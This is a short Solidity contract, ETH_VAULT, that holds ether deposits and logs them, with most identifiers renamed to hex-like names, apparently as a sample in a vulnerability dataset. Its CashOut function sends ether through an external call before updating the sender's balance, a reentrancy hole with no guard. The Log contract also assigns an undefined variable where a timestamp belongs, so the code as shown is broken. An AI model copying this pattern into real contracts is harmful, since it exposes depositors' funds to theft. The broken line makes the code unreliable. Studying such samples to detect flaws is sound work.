pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public _0xed0e57;

    Log TransferLog;

    uint public MinDeposit = 1 ether;

    function ETH_VAULT(address _0x4b673f)
    public
    {
        TransferLog = Log(_0x4b673f);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            _0xed0e57[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _0x2dca5d)
    public
    payable
    {
        if(_0x2dca5d<=_0xed0e57[msg.sender])
        {
            if(msg.sender.call.value(_0x2dca5d)())
            {
                _0xed0e57[msg.sender]-=_0x2dca5d;
                TransferLog.AddMessage(msg.sender,_0x2dca5d,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x4f8d07,uint _0x0dce8a,string _0xc458b2)
    public
    {
        LastMsg.Sender = _0x4f8d07;
        LastMsg.Time = _0xcaa325;
        LastMsg.Val = _0x0dce8a;
        LastMsg.Data = _0xc458b2;
        History.push(LastMsg);
    }
}